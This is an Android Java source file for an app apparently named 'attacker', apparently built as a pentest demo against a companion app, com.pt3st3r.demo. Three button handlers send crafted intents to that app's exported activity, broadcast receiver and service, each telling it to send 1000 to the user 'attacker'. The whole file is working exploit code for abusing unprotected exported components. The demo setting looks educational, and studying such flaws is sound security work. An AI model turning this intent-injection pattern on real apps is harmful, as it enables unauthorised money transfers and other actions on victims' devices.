package com.pt3st3r.attacker;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button attackActivity = findViewById(R.id.attack_activity_exported);
        attackActivity.setOnClickListener(view -> attackActivity());
        Button attackBroadcast = findViewById(R.id.attack_broadcast_exported);
        attackBroadcast.setOnClickListener(view -> attackBroadcast());
        Button attackService = findViewById(R.id.attack_service_exported);
        attackService.setOnClickListener(view -> attackService());
    }

    private void attackActivity(){
        Intent victimIntent = new Intent(Intent.ACTION_SEND);
        victimIntent.setClassName("com.pt3st3r.demo", "com.pt3st3r.demo.SendMoneyActivity");
        victimIntent.putExtra("toUser", "attacker");
        victimIntent.putExtra("amount", "1000");
        startActivity(victimIntent);
    }

    private void attackBroadcast(){
        Intent victimIntent = new Intent();
        victimIntent.setAction("com.pt3st3r.demo.SendMoney");
        victimIntent.putExtra("toUser", "attacker");
        victimIntent.putExtra("amount", "1000");
        sendBroadcast(victimIntent);
    }

    private void attackService(){
        Intent victimIntent = new Intent();
        victimIntent.setClassName("com.pt3st3r.demo", "com.pt3st3r.demo.ServiceManager");
        victimIntent.setAction("com.pt3st3r.demo.START_SERVICE");
        victimIntent.putExtra("toUser", "attacker");
        victimIntent.putExtra("amount", "1000");
        startService(victimIntent);
    }
}